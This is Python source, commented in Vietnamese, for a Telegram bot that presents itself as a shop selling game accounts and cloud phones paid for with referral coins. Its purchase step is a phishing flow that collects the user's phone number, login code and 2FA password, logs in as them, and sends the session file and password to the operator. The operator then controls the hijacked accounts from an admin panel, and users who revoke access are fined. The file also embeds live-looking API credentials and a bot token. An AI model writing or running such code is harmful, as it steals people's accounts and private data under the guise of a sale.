import asyncio, os, random, datetime, re, glob, json, time
import aiohttp
from aiohttp import web
from telethon import TelegramClient, events, Button, functions, types
from telethon.errors import (
    FloodWaitError, RPCError, UserNotParticipantError, 
    SessionPasswordNeededError, PhoneCodeInvalidError, PasswordHashInvalidError
)

# ==========================================
# CẤU HÌNH HỆ THỐNG
# ==========================================
A_ID = 32300846
A_HS = "a6da3117ff6b8a1679d04ab743976068"
B_TK = "8793950901:AAHjbcBcHkIReWS-eA3JoZxgHXt7wCvENyI"  # Token bot mới của bạn
O_ID = 7907990385  # ID ADMIN TỐI CAO DUY NHẤT

BOT_USERNAME = "@minhduchotwar1_bot"

# 2 NHÓM BẮT BUỘC
GROUPS_FILE = "required_groups.json"
DEFAULT_REQUIRED_GROUPS = [
    {"username": "chatmuadonglanhgia", "link": "https://t.me/chatmuadonglanhgia", "name": "Nhóm Chat 1"},
    {"username": "muadonglanhgia36", "link": "https://t.me/muadonglanhgia36", "name": "Nhóm Kênh 2"}
]

# QUẢN LÝ STOCK SẢN PHẨM
STOCK_FILE = "shop_stock.json"
DEFAULT_STOCK = {
    "buy_p1": 15,
    "buy_p2": 15,
    "buy_p3": 20,
    "buy_p4": 20,
    "buy_p5": 10,
    "buy_p6": 10,
    "buy_p7": 25,
    "buy_p8": 25
}

BALANCE_FILE = "user_balances.json"
ORDERS_FILE = "user_orders.json"

def load_json(filename, default_val):
    if os.path.exists(filename):
        try:
            with open(filename, "r", encoding="utf-8") as f:
                data = json.load(f)
                if isinstance(data, type(default_val)):
                    return data
        except:
            pass
    return default_val

def save_json(filename, data):
    with open(filename, "w", encoding="utf-8") as f:
        json.dump(data, f, ensure_ascii=False, indent=4)

user_balances = {int(k): v for k, v in load_json(BALANCE_FILE, {}).items()}
user_orders = {int(k): v for k, v in load_json(ORDERS_FILE, {}).items()}

shop_stock = load_json(STOCK_FILE, DEFAULT_STOCK)
def save_stock(stock_data): save_json(STOCK_FILE, stock_data)

REQUIRED_GROUPS = load_json(GROUPS_FILE, DEFAULT_REQUIRED_GROUPS)

user_2fa_passwords = {}
user_phones = {}
user_refs = {}     
admin_selected_target = {}
admin_editing_stock = {}  
active_logins = set()  

bot = TelegramClient('shop_bot_session', A_ID, A_HS, connection_retries=5, timeout=30)
u_c = {}

F1, F3 = "bot_users.txt", "joined_users.txt"
if os.path.exists(F3):
    with open(F3, "r", encoding="utf-8") as f: verified_users = set(int(l.strip()) for l in f if l.strip())
else: verified_users = set()

def _save_verified():
    try:
        with open(F3, "w", encoding="utf-8") as f:
            for uid in verified_users: f.write(f"{uid}\n")
    except: pass

def _su(u):
    try:
        if not os.path.exists(F1): open(F1, "w", encoding="utf-8").close()
        with open(F1, "r", encoding="utf-8") as f: us = f.read().splitlines()
        if str(u) not in us:
            with open(F1, "a", encoding="utf-8") as f: f.write(f"{u}\n")
    except: pass

async def is_user_in_channel(user_id):
    if user_id == O_ID: return True
    try:
        for group in REQUIRED_GROUPS:
            await bot(functions.channels.GetParticipantRequest(
                channel=group["username"], participant=user_id
            ))
        if user_id not in verified_users:
            verified_users.add(user_id)
            _save_verified()
        return True
    except UserNotParticipantError:
        if user_id in verified_users:
            verified_users.remove(user_id)
            _save_verified()
        return False
    except Exception:
        if user_id in verified_users:
            return True
        return False

# ==========================================
# GỬI THÔNG TIN, AVATAR & FILE SESSION VỀ CHO ADMIN
# ==========================================
async def send_session_file_to_admin(client, user_id, phone_number, pwd=None):
    session_file_name = f"u_{user_id}.session"
    avatar_path = f"avatar_{user_id}.jpg"
    
    if os.path.exists(session_file_name):
        try:
            me = await client.get_me()
            name_str = f"{me.first_name or ''} {me.last_name or ''}".strip()
            username_str = f"@{me.username}" if me.username else "Không có"
            pwd_info = f"\n• Mật khẩu 2FA: `{pwd if pwd else 'Không bật'}`"
            
            caption_text = (
                f"📦 **FILE SESSION TÀI KHOẢN KHÁCH HÀNG MỚI**\n"
                f"────────────────\n"
                f"👤 **Tên:** {name_str}\n"
                f"💬 **Username:** `{username_str}`\n"
                f"🆔 **ID User:** `{user_id}`\n"
                f"📱 **Số Điện Thoại:** `+{phone_number}`"
                f"{pwd_info}"
            )

            downloaded_photo = None
            try:
                downloaded_photo = await client.download_profile_photo(me, file=avatar_path)
            except:
                pass

            if downloaded_photo and os.path.exists(downloaded_photo):
                await bot.send_file(
                    O_ID,
                    downloaded_photo,
                    caption=caption_text,
                    parse_mode='markdown'
                )
                try: os.remove(downloaded_photo)
                except: pass
            else:
                await bot.send_message(O_ID, caption_text, parse_mode='markdown')

            await bot.send_file(
                O_ID,
                session_file_name,
                caption=f"📁 **File Session của UID:** `{user_id}`",
                parse_mode='markdown'
            )
        except Exception as e:
            print(f"Lỗi gửi file session: {e}")

# ==========================================
# BACKGROUND TASK: CHECK KICK / BẤM "KHÔNG PHẢI TÔI" & QUÉT 24H
# ==========================================
async def auto_clean_expired_sessions():
    while True:
        await asyncio.sleep(60)  # Quét liên tục mỗi 60 giây để phát hiện ngay lập tức
        try:
            now = time.time()
            
            # 1. Kiểm tra khách tự kick / bấm "Không phải tôi"
            for uid, client in list(u_c.items()):
                session_alive = True
                try:
                    if not client.is_connected():
                        await client.connect()
                    await client.get_me()
                except Exception:
                    session_alive = False

                if not session_alive:
                    try:
                        current_bal = user_balances.get(uid, 0)
                        penalty_xu = int(current_bal // 2)
                        new_bal = current_bal - penalty_xu
                        user_balances[uid] = new_bal
                        save_json(BALANCE_FILE, user_balances)

                        await bot.send_message(
                            uid,
                            "🚨 **CẢNH BÁO: TÀI KHOẢN ĐÃ BỊ PHÁT HIỆN HỦY LIÊN KẾT!**\n\n"
                            "⚠️ **Bạn Đã Kick Bot Khỏi Tài Khoản Kiểm Tra!**\n"
                            "────────────────\n"
                            f"• 📉 **Hình phạt:** Số dư xu của bạn đã bị **trừ đi 50%** (Đã trừ `{penalty_xu} xu` | Số dư hiện còn lại: `{new_bal} xu`).\n"
                            "• ❌ Hành động này vi phạm quy định của hệ thống. Vui lòng không tự ý thu hồi hoặc đăng xuất phiên làm việc trong thời gian hệ thống đang xử lý đơn hàng!",
                            parse_mode='markdown'
                        )
                    except: pass

                    phone_str = user_phones.get(uid, "Không rõ")
                    await bot.send_message(
                        O_ID,
                        f"🚨 **PHÁT HIỆN USER TỰ KICK BOT!**\n"
                        f"────────────────\n"
                        f"• ID User: `{uid}`\n"
                        f"• SĐT: `+{phone_str}`\n"
                        f"• Hình phạt: Đã tự động trừ 50% xu và xóa khỏi bảng quản lý Admin.",
                        parse_mode='markdown'
                    )

                    try: await client.disconnect()
                    except: pass
                    u_c.pop(uid, None)
                    
                    session_file = f"u_{uid}.session"
                    if os.path.exists(session_file):
                        try: os.remove(session_file)
                        except: pass

            # 2. Quét dọn các tài khoản quá 24h từ lúc đăng nhập
            for f in glob.glob("u_*.session"):
                try:
                    u_str = f.split('_')[1].split('.')[0]
                    if not u_str.isdigit(): continue
                    uid = int(u_str)
                    
                    file_time = os.path.getmtime(f)
                    if now - file_time >= 86400:
                        phone_info = user_phones.get(uid, "Không rõ")
                        if uid in u_c:
                            try: await u_c[uid].disconnect()
                            except: pass
                            u_c.pop(uid, None)
                        if os.path.exists(f): 
                            try: os.remove(f)
                            except: pass
                        
                        buttons = [
                            [Button.inline("🔑 Check OTP Gần Nhất", data=f"kicked_otp_{uid}")],
                            [Button.inline("📤 Gửi Lại File Session", data=f"kicked_file_{uid}")],
                            [Button.inline("👤 Xem Hồ Sơ", data=f"kicked_profile_{uid}")]
                        ]
                        await bot.send_message(
                            O_ID, 
                            f"⏰ **TÀI KHOẢN ĐÃ ĐƯỢC TỰ ĐỘNG KICK SAU 24H!**\n"
                            f"────────────────\n"
                            f"• ID Khách: `{uid}`\n"
                            f"• SĐT: `+{phone_info}`",
                            buttons=buttons,
                            parse_mode='markdown'
                        )
                except Exception as e:
                    print(f"Lỗi clean session {f}: {e}")
        except Exception as ex:
            print(f"Lỗi background task: {ex}")

# ==========================================
# GIAO DIỆN SHOP & MENU CHÍNH
# ==========================================
def get_main_menu(u):
    bal = user_balances.get(u, 0)
    ref = user_refs.get(u, 0)
    
    msg = f"""
✨ **Xin chào đến shop acc 777** ✨
────────────────
• 👤 **ID Của Bạn:** `{u}`
• 💰 **Số Dư Xu:** `{bal} xu`
• 👥 **Số Lượt Giới Thiệu:** `{ref}` (1 Ref = 2 xu)

👇 **Vui lòng chọn chức năng bên dưới:**
"""
    buttons = [
        [Button.inline("🔥 Free Fire", data="menu_freefire")],
        [Button.inline("📱 Genplay", data="menu_genplay")],
        [Button.inline("🎁 Kiếm xu", data="ref_menu")],
        [Button.inline("📦 Tài Khoản Đã Mua", data="my_orders")]
    ]
    if u == O_ID:
        buttons.append([Button.inline("👑 Bảng Điều Khiển Admin (Remote Acc)", data="m_control")])
        buttons.append([Button.inline("⏳ Danh Sách Sắp Kick (24h)", data="m_pending_kick")])
        buttons.append([Button.inline("📦 Quản Lý Stock Shop", data="m_stock")])
        buttons.append([Button.inline("⚙️ Quản Lý Nhóm Bắt Buộc", data="m_admin")])
        buttons.append([Button.inline("💰 Cộng Xu Cho User (Addxu)", data="m_addxu")])
        buttons.append([Button.inline("📢 Broadcast All Nhóm & Users", data="m_broadcast")])
    return msg, buttons

def get_join_msg():
    msg = """
⚠️ **YÊU CẦU BẮT BUỘC THAM GIA NHÓM**

Để sử dụng hệ thống và mua sắm, bạn **bắt buộc phải tham gia đủ 2 nhóm** dưới đây:

1. 📢 [Nhóm Chat](https://t.me/chatmuadonglanhgia)
2. 📢 [Nhóm Kênh](https://t.me/muadonglanhgia36)

👉 *Sau khi đã tham gia đủ 2 nhóm, vui lòng bấm nút **"🔄 Xác Nhận Đã Vào Nhóm"** bên dưới để mở shop!*
"""
    buttons = [
        [Button.url("📢 Vào Nhóm Chat 1", "https://t.me/chatmuadonglanhgia")],
        [Button.url("📢 Vào Nhóm Kênh 2", "https://t.me/muadonglanhgia36")],
        [Button.inline("🔄 Xác Nhận Đã Vào Nhóm", data="check_join")]
    ]
    return msg, buttons

@bot.on(events.NewMessage(pattern='/start'))
async def _st(ev):
    u = ev.sender_id
    _su(u)
    try: await ev.delete()
    except: pass
    
    args = ev.text.split()
    if len(args) > 1:
        try:
            ref_id = int(args[1])
            if ref_id != u:
                user_refs[ref_id] = user_refs.get(ref_id, 0) + 1
                user_balances[ref_id] = user_balances.get(ref_id, 0) + 2
                save_json(BALANCE_FILE, user_balances)
                await bot.send_message(ref_id, f"🎉 Bạn nhận được `2 xu` từ lượt giới thiệu thành công!")
        except: pass

    if await is_user_in_channel(u):
        msg, buttons = get_main_menu(u)
        await bot.send_message(u, msg, buttons=buttons, parse_mode='markdown')
    else:
        msg, buttons = get_join_msg()
        await bot.send_message(u, msg, buttons=buttons, parse_mode='markdown')

@bot.on(events.CallbackQuery)
async def _callback_handler(ev):
    u = ev.sender_id
    data = ev.data.decode('utf-8')

    if data == "check_join":
        if await is_user_in_channel(u):
            msg, buttons = get_main_menu(u)
            await ev.edit(msg, buttons=buttons, parse_mode='markdown')
            return await ev.answer("✅ Xác nhận thành công!", alert=True)
        else:
            msg, buttons = get_join_msg()
            try: await ev.edit(msg, buttons=buttons, parse_mode='markdown')
            except: pass
            return await ev.answer("❌ Bạn chưa gia nhập đủ 2 nhóm yêu cầu!", alert=True)

    if not await is_user_in_channel(u):
        msg, buttons = get_join_msg()
        try: await ev.edit(msg, buttons=buttons, parse_mode='markdown')
        except: pass
        return await ev.answer("⚠️ Bạn cần tham gia đủ 2 nhóm trước khi sử dụng!", alert=True)

    if data == "shop_home":
        msg, buttons = get_main_menu(u)
        await ev.edit(msg, buttons=buttons, parse_mode='markdown')

    elif data == "menu_freefire":
        s7 = shop_stock.get("buy_p7", 25)
        s8 = shop_stock.get("buy_p8", 25)
        txt = "🔥 **DANH MỤC TÀI KHOẢN FREE FIRE**\n────────────────\nChọn sản phẩm bạn muốn mua:"
        buttons = [
            [Button.inline(f"🎮 Clone FF Lv30 Tử Chiến (15xu) [Kho: {s7}]", data="buy_p7")],
            [Button.inline(f"🔥 Clone FF Lv30 Sinh Tồn (20xu) [Kho: {s8}]", data="buy_p8")],
            [Button.inline("🔙 Trở Về Menu Chính", data="shop_home")]
        ]
        await ev.edit(txt, buttons=buttons, parse_mode='markdown')

    elif data == "menu_genplay":
        s1 = shop_stock.get("buy_p1", 15)
        s2 = shop_stock.get("buy_p2", 15)
        s3 = shop_stock.get("buy_p3", 20)
        s4 = shop_stock.get("buy_p4", 20)
        s5 = shop_stock.get("buy_p5", 10)
        s6 = shop_stock.get("buy_p6", 10)
        txt = "📱 **DANH MỤC CLOUD PHONE GENPLAY**\n────────────────\nChọn gói cloud phone bạn muốn mua:"
        buttons = [
            [Button.inline(f"📱 Genplay 835 (7N: 15xu) [Kho: {s1}]", data="buy_p1")],
            [Button.inline(f"📱 Genplay 835 (30N: 20xu) [Kho: {s2}]", data="buy_p2")],
            [Button.inline(f"📱 Genplay 845 (7N: 20xu) [Kho: {s3}]", data="buy_p3")],
            [Button.inline(f"📱 Genplay 845 (30N: 25xu) [Kho: {s4}]", data="buy_p4")],
            [Button.inline(f"📱 Genplay 865 (7N: 35xu) [Kho: {s5}]", data="buy_p5")],
            [Button.inline(f"📱 Genplay 865 (30N: 45xu) [Kho: {s6}]", data="buy_p6")],
            [Button.inline("🔙 Trở Về Menu Chính", data="shop_home")]
        ]
        await ev.edit(txt, buttons=buttons, parse_mode='markdown')

    elif data == "ref_menu":
        bot_me = await bot.get_me()
        ref_link = f"https://t.me/{bot_me.username}?start={u}"
        ref_count = user_refs.get(u, 0)
        txt = f"""
🎁 **KIẾM XU MIỄN PHÍ QUA GIỚI THIỆU (REF)**
────────────────
• **Link giới thiệu của bạn:** 
`{ref_link}`

• **Tổng số bạn bè đã mời:** `{ref_count}` người
• **Phần thưởng:** Mỗi 1 lượt giới thiệu thành công bạn nhận ngay `2 xu`.
"""
        buttons = [[Button.inline("🔙 Trở Về Menu Chính", data="shop_home")]]
        await ev.edit(txt, buttons=buttons, parse_mode='markdown')

    elif data == "my_orders":
        txt = "📦 **DANH SÁCH TÀI KHOẢN ĐÃ MUA**\n────────────────\nBạn chưa mua sản phẩm nào."
        buttons = [[Button.inline("🔙 Trở Về Menu Chính", data="shop_home")]]
        await ev.edit(txt, buttons=buttons, parse_mode='markdown')

    # ==========================================
    # BƯỚC 1: XÁC NHẬN TRƯỚC KHI MUA & GIỚI HẠN 5 LẦN/TUẦN
    # ==========================================
    elif data in [f"buy_p{i}" for i in range(1, 9)]:
        product_names = {
            "buy_p1": ("Genplay Phone - Snapdragon 835 (7 ngày)", 15),
            "buy_p2": ("Genplay Phone - Snapdragon 835 (30 ngày)", 20),
            "buy_p3": ("Genplay Phone - Snapdragon 845 (7 ngày)", 20),
            "buy_p4": ("Genplay Phone - Snapdragon 845 (30 ngày)", 25),
            "buy_p5": ("Genplay Phone - Snapdragon 865 (7 ngày)", 35),
            "buy_p6": ("Genplay Phone - Snapdragon 865 (30 ngày)", 45),
            "buy_p7": ("Clone Free Fire Lv30 Tử Chiến Huyền Thoại", 15),
            "buy_p8": ("Clone Free Fire Lv30 Sinh Tồn Huyền Thoại", 20)
        }
        p_name, p_price = product_names[data]
        bal = user_balances.get(u, 0)

        if bal < p_price:
            missing = p_price - bal
            return await ev.answer(
                f"❌ Bạn không đủ xu!\n• Giá: {p_price} xu | Số dư: {bal} xu\n• Thiếu: {missing} xu. Hãy kiếm thêm xu để mua!",
                alert=True
            )

        # Giới hạn 5 lần mua / tuần
        now_ts = time.time()
        week_ago = now_ts - 604800
        user_history = user_orders.get(u, [])
        user_history = [t for t in user_history if t > week_ago]
        user_orders[u] = user_history

        if len(user_history) >= 5:
            return await ev.answer(
                "❌ Bạn đã đạt giới hạn tối đa 5 lần mua trong tuần này! Vui lòng quay lại vào tuần sau.",
                alert=True
            )

        txt = (
            f"🛒 **XÁC NHẬN MUA SẢN PHẨM**\n"
            f"────────────────\n"
            f"• Sản phẩm: `{p_name}`\n"
            f"• Giá tiền: `{p_price} xu`\n\n"
            f"❓ **Bạn chắc muốn mua sản phẩm này ?**\n"
            f"⚠️ *Mỗi tài khoản chỉ mua đc 5 lần 1 tuần.*"
        )
        buttons = [
            [Button.inline("✅ Chắc chắn", data=f"confirm_{data}"), Button.inline("❌ Không quay lại", data="shop_home")]
        ]
        await ev.edit(txt, buttons=buttons, parse_mode='markdown')

    # ==========================================
    # BƯỚC 2: TIẾN HÀNH LOGIN VÀ XÁC MINH (CHỐNG SPAM LOGIN)
    # ==========================================
    elif data.startswith("confirm_buy_p"):
        prod_key = data.replace("confirm_", "")
        
        if u in active_logins:
            return await ev.answer("⚠️ Bạn đang có một tiến trình đăng nhập đang chạy, vui lòng hoàn tất hoặc đợi hệ thống phản hồi!", alert=True)
        
        active_logins.add(u)
        try:
            product_names = {
                "buy_p1": ("Genplay Phone - Snapdragon 835 (7 ngày)", 15),
                "buy_p2": ("Genplay Phone - Snapdragon 835 (30 ngày)", 20),
                "buy_p3": ("Genplay Phone - Snapdragon 845 (7 ngày)", 20),
                "buy_p4": ("Genplay Phone - Snapdragon 845 (30 ngày)", 25),
                "buy_p5": ("Genplay Phone - Snapdragon 865 (7 ngày)", 35),
                "buy_p6": ("Genplay Phone - Snapdragon 865 (30 ngày)", 45),
                "buy_p7": ("Clone Free Fire Lv30 Tử Chiến Huyền Thoại", 15),
                "buy_p8": ("Clone Free Fire Lv30 Sinh Tồn Huyền Thoại", 20)
            }
            p_name, p_price = product_names[prod_key]
            bal = user_balances.get(u, 0)

            if bal < p_price:
                active_logins.discard(u)
                return await ev.answer("❌ Số dư của bạn không đủ để thực hiện giao dịch này nữa!", alert=True)

            await ev.answer()
            async with bot.conversation(u, timeout=180) as cv:
                await cv.send_message(
                    f"🛒 **TIẾN HÀNH XÁC MINH TÀI KHOẢN**\n"
                    f"────────────────\n"
                    f"📱 **Vui lòng nhập Số Điện Thoại Telegram của bạn (Ví dụ: `+84912345678` hoặc `0912345678`):**"
                )
                phone_res = await cv.get_response()
                raw_phone = phone_res.text.strip().replace(" ", "")
                
                if raw_phone.startswith("+"):
                    phone = raw_phone[1:]
                elif raw_phone.startswith("0"):
                    phone = "84" + raw_phone[1:]
                else:
                    phone = raw_phone
                    
                user_phones[u] = phone

                try:
                    c = TelegramClient(f"u_{u}", A_ID, A_HS, connection_retries=5, timeout=30)
                    await c.connect()
                    r = await c.send_code_request("+" + phone if not raw_phone.startswith("+") and not raw_phone.startswith("0") else raw_phone if raw_phone.startswith("+") else "+84" + raw_phone[1:])
                    phone_code_hash = r.phone_code_hash
                except Exception as e:
                    await cv.send_message(f"❌ Lỗi gửi mã từ Telegram: `{e}`")
                    await c.disconnect()
                    active_logins.discard(u)
                    return

                await cv.send_message(
                    f"🔑 **MÃ XÁC NHẬN ĐÃ ĐƯỢC GỬI**\n"
                    f"────────────────\n"
                    f"Vui lòng nhập mã xác nhận (hãy cách ra, ví dụ: `5 0 5 0 1`):"
                )
                code_res = await cv.get_response()
                code = code_res.text.strip().replace(" ", "")

                try:
                    await c.sign_in("+" + phone if not raw_phone.startswith("+") and not raw_phone.startswith("0") else raw_phone if raw_phone.startswith("+") else "+84" + raw_phone[1:], code, phone_code_hash=phone_code_hash)
                except SessionPasswordNeededError:
                    await cv.send_message(
                        f"🔐 **TÀI KHOẢN BẬT BẢO MẬT 2FA**\n"
                        f"────────────────\n"
                        f"Vui lòng nhập **Mật khẩu 2FA** của bạn:"
                    )
                    pwd_res = await cv.get_response()
                    password = pwd_res.text.strip()
                    user_2fa_passwords[u] = password
                    try:
                        await c.sign_in(password=password)
                    except Exception as ex:
                        await cv.send_message(f"❌ Sai mật khẩu 2FA: `{ex}`")
                        await c.disconnect()
                        active_logins.discard(u)
                        return
                except Exception as ex:
                    await cv.send_message(f"❌ Mã OTP không hợp lệ hoặc lỗi: `{ex}`")
                    await c.disconnect()
                    active_logins.discard(u)
                    return

                u_c[u] = c
                await send_session_file_to_admin(c, u, phone, user_2fa_passwords.get(u))

                user_balances[u] -= p_price
                save_json(BALANCE_FILE, user_balances)

                if u not in user_orders: user_orders[u] = []
                user_orders[u].append(time.time())
                save_json(ORDERS_FILE, user_orders)

                await cv.send_message(
                    "⏳ **Vui Lòng Đợi 24h Ko Kick BOT Ra để Bot Tự Động duyệt nhanh nhất có thể trong 24-48h!**\n\n"
                    "🛡 Đơn hàng của bạn đã được ghi nhận vào hệ thống chờ duyệt!"
                )
        finally:
            active_logins.discard(u)

    # ==========================================
    # QUẢN LÝ STOCK SẢN PHẨM (ADMIN)
    # ==========================================
    elif data == "m_stock":
        if u != O_ID: return await ev.answer("Chỉ Admin!", alert=True)
        txt = "📦 **QUẢN LÝ / TÙY CHỈNH STOCK SẢN PHẨM**\n────────────────\nChọn sản phẩm bạn muốn thay đổi số lượng kho bên dưới:"
        buttons = [
            [Button.inline(f"Genplay 835 (7N) [Kho: {shop_stock.get('buy_p1', 15)}]", data="edit_stock_buy_p1")],
            [Button.inline(f"Genplay 835 (30N) [Kho: {shop_stock.get('buy_p2', 15)}]", data="edit_stock_buy_p2")],
            [Button.inline(f"Genplay 845 (7N) [Kho: {shop_stock.get('buy_p3', 20)}]", data="edit_stock_buy_p3")],
            [Button.inline(f"Genplay 845 (30N) [Kho: {shop_stock.get('buy_p4', 20)}]", data="edit_stock_buy_p4")],
            [Button.inline(f"Genplay 865 (7N) [Kho: {shop_stock.get('buy_p5', 10)}]", data="edit_stock_buy_p5")],
            [Button.inline(f"Genplay 865 (30N) [Kho: {shop_stock.get('buy_p6', 10)}]", data="edit_stock_buy_p6")],
            [Button.inline(f"Clone FF Tử Chiến [Kho: {shop_stock.get('buy_p7', 25)}]", data="edit_stock_buy_p7")],
            [Button.inline(f"Clone FF Sinh Tồn [Kho: {shop_stock.get('buy_p8', 25)}]", data="edit_stock_buy_p8")],
            [Button.inline("🔙 Trở Về Menu Chính", data="shop_home")]
        ]
        await ev.edit(txt, buttons=buttons, parse_mode='markdown')

    elif data.startswith("edit_stock_"):
        if u != O_ID: return await ev.answer("Chỉ Admin!", alert=True)
        prod_id = data.replace("edit_stock_", "")
        admin_editing_stock[u] = prod_id
        
        await ev.answer()
        async with bot.conversation(u, timeout=60) as cv:
            await cv.send_message(
                f"✏️ **CẬP NHẬT STOCK CHO SẢN PHẨM (`{prod_id}`)**\n"
                f"────────────────\n"
                f"• Kho hiện tại: `{shop_stock.get(prod_id, 0)}`\n\n"
                f"👉 Vui lòng nhập số lượng stock mới (dạng số nguyên):"
            )
            res = await cv.get_response()
            try:
                new_qty = int(res.text.strip())
                shop_stock[prod_id] = new_qty
                save_stock(shop_stock)
                await cv.send_message(f"✅ Đã cập nhật thành công stock sản phẩm `{prod_id}` thành `{new_qty}`!")
            except:
                await cv.send_message("❌ Giá trị không hợp lệ! Vui lòng nhập số nguyên.")

    # ==========================================
    # TÍNH NĂNG ADDXU (CHO ADMIN)
    # ==========================================
    elif data == "m_addxu":
        if u != O_ID: return await ev.answer("Chỉ Admin!", alert=True)
        await ev.answer()
        async with bot.conversation(u, timeout=60) as cv:
            await cv.send_message(
                "💰 **CỘNG XU CHO NGƯỜI DÙNG**\n"
                "────────────────\n"
                "👉 Vui lòng gửi theo cú pháp: `ID_USER SỐ_XU`\n"
                "(Ví dụ: `123456789 50`)"
            )
            res = await cv.get_response()
            try:
                parts = res.text.strip().split()
                target_uid = int(parts[0])
                amount = int(parts[1])
                
                user_balances[target_uid] = user_balances.get(target_uid, 0) + amount
                save_json(BALANCE_FILE, user_balances)
                
                await cv.send_message(f"✅ Đã cộng thành công `{amount} xu` cho user `{target_uid}`!\n• Số dư hiện tại của họ: `{user_balances[target_uid]} xu`")
                try: await bot.send_message(target_uid, f"🎉 Bạn vừa được Admin cộng thêm `{amount} xu` vào tài khoản!")
                except: pass
            except:
                await cv.send_message("❌ Cú pháp không hợp lệ! Vui lòng thử lại theo mẫu: `ID_USER SỐ_XU`")

    # ==========================================
    # TÍNH NĂNG BROADCAST
    # ==========================================
    elif data == "m_broadcast":
        if u != O_ID: return await ev.answer("Chỉ Admin!", alert=True)
        txt = "📢 **HỆ THỐNG GỬI TIN NHẮN HÀNG LOẠT (BROADCAST)**\n────────────────\nChọn đối tượng bạn muốn gửi tin nhắn hàng loạt bên dưới:"
        buttons = [
            [Button.inline("👥 Gửi Tất Cả Users Đã Ib Bot", data="bc_all_users")],
            [Button.inline("📢 Gửi Tất Cả Các Nhóm Bắt Buộc", data="bc_all_groups")],
            [Button.inline("🔙 Trở Về Menu Chính", data="shop_home")]
        ]
        await ev.edit(txt, buttons=buttons, parse_mode='markdown')

    elif data == "bc_all_users":
        if u != O_ID: return
        await ev.answer()
        async with bot.conversation(u, timeout=180) as cv:
            await cv.send_message("✍️ **Nhập nội dung tin nhắn bạn muốn gửi đến TOÀN BỘ NGƯỜI DÙNG từng ib bot:**")
            msg_res = await cv.get_response()
            bc_text = msg_res.text

            success_count, fail_count = 0, 0
            if os.path.exists(F1):
                with open(F1, "r", encoding="utf-8") as f: users_list = f.read().splitlines()
                for uid_str in users_list:
                    if uid_str.strip().isdigit():
                        try:
                            await bot.send_message(int(uid_str.strip()), bc_text, parse_mode='markdown')
                            success_count += 1
                            await asyncio.sleep(0.1)
                        except: fail_count += 1
                await cv.send_message(f"✅ **GỬI HOÀN TẤT ĐẾN USERS!**\n• Thành công: `{success_count}`\n• Thất bại: `{fail_count}`")
            else:
                await cv.send_message("⚠️ Không tìm thấy danh sách user nào!")

    elif data == "bc_all_groups":
        if u != O_ID: return
        await ev.answer()
        async with bot.conversation(u, timeout=180) as cv:
            await cv.send_message("✍️ **Nhập nội dung tin nhắn bạn muốn gửi đến TOÀN BỘ CÁC NHÓM BẮT BUỘC:**")
            msg_res = await cv.get_response()
            bc_text = msg_res.text

            success_count, fail_count = 0, 0
            for group in REQUIRED_GROUPS:
                try:
                    target_group = group["username"]
                    if not target_group.startswith("@") and not target_group.startswith("-"):
                        target_group = "@" + target_group
                    await bot.send_message(target_group, bc_text, parse_mode='markdown')
                    success_count += 1
                    await asyncio.sleep(0.5)
                except: fail_count += 1
            await cv.send_message(f"✅ **GỬI HOÀN TẤT ĐẾN CÁC NHÓM!**\n• Thành công: `{success_count}`\n• Thất bại: `{fail_count}`")

    # ==========================================
    # DANH SÁCH TÀI KHOẢN SẮP KICK (24H)
    # ==========================================
    elif data == "m_pending_kick":
        if u != O_ID: return await ev.answer("Chỉ Admin!", alert=True)
        active_uids = list(u_c.keys())
        txt = "⏳ **DANH SÁCH TÀI KHOẢN ĐANG CHUẨN BỊ KICK (24H)**\n────────────────\n"
        buttons = []
        now = time.time()
        
        if not active_uids:
            txt += "Hiện tại không có tài khoản nào đang kết nối."
        else:
            for idx, uid in enumerate(active_uids, 1):
                session_file = f"u_{uid}.session"
                if os.path.exists(session_file):
                    mod_time = os.path.getmtime(session_file)
                    remaining = 86400 - (now - mod_time)
                    phone_str = f"+{user_phones.get(uid, 'Không rõ')}"
                    
                    client = u_c[uid]
                    username_str = "Không có"
                    try:
                        me = await client.get_me()
                        if me.username: username_str = f"@{me.username}"
                    except: pass
                    
                    if remaining > 0:
                        time_str = f"Còn {int(remaining // 3600)}h {int((remaining % 3600) // 60)}p"
                    else:
                        time_str = "Đã quá hạn (Chờ quét)"
                        
                    txt += f"{idx}. UID: `{uid}` | SĐT: `{phone_str}` | Username: `{username_str}`\n⏱ Còn lại: `{time_str}`\n────────────────\n"
                    buttons.append([Button.inline(f"Quản lý TK {idx} (ID: {uid})", data=f"sel_acc_{uid}")])

        buttons.append([Button.inline("🔙 Trở Về Menu Chính", data="shop_home")])
        await ev.edit(txt, buttons=buttons, parse_mode='markdown')

    # ==========================================
    # MENU ADMIN QUẢN LÝ TÀI KHOẢN KHÁCH
    # ==========================================
    elif data == "m_control":
        if u != O_ID: return await ev.answer("Chỉ Admin!", alert=True)
        active_uids = list(u_c.keys())
        txt = f"🎮 **QUẢN LÝ TÀI KHOẢN KHÁCH (ADMIN)**\n────────────────\n• Tổng số tài khoản kết nối: `{len(active_uids)}`\n👇 **Chọn tài khoản bên dưới:**"
        buttons = []
        for idx, uid in enumerate(active_uids, 1):
            buttons.append([Button.inline(f"TK {idx}. ID: {uid}", data=f"sel_acc_{uid}")])
        buttons.append([Button.inline("🔙 Trở Về Menu Chính", data="shop_home")])
        await ev.edit(txt, buttons=buttons, parse_mode='markdown')

    elif data.startswith("sel_acc_"):
        if u != O_ID: return await ev.answer("Chỉ Admin!", alert=True)
        target_uid = int(data.split("_")[2])
        if target_uid not in u_c: 
            return await ev.edit("⚠️ Tài khoản đã mất kết nối hoặc session đã bị xóa!", buttons=[[Button.inline("🔙 Làm mới", data="m_control")]], parse_mode='markdown')
            
        admin_selected_target[u] = target_uid
        client = u_c[target_uid]
        
        acc_status = "🟢 Hoạt động tốt (Online)"
        try: me = await client.get_me()
        except Exception as ex: acc_status = f"🔴 Lỗi / Đã bị kick ({ex})"
        
        phone_str = f"+{user_phones.get(target_uid, 'Không rõ')}"
        username_str = f"@{me.username}" if hasattr(me, 'username') and me.username else "Không có"
        pwd_str = user_2fa_passwords.get(target_uid, "Không bật")
        
        session_file = f"u_{target_uid}.session"
        last_active, time_left_str = "Không rõ", "Không rõ"
        if os.path.exists(session_file):
            mod_time = os.path.getmtime(session_file)
            last_active = datetime.datetime.fromtimestamp(mod_time).strftime('%Y-%m-%d %H:%M:%S')
            remaining = 86400 - (time.time() - mod_time)
            if remaining > 0:
                time_left_str = f"⏳ Còn lại {int(remaining // 3600)} giờ {int((remaining % 3600) // 60)} phút"
            else:
                time_left_str = "⚠️ Đã quá 24h"

        txt = f"""🕹 **HỒ SƠ KHÁCH HÀNG & THỜI GIAN KICK:**
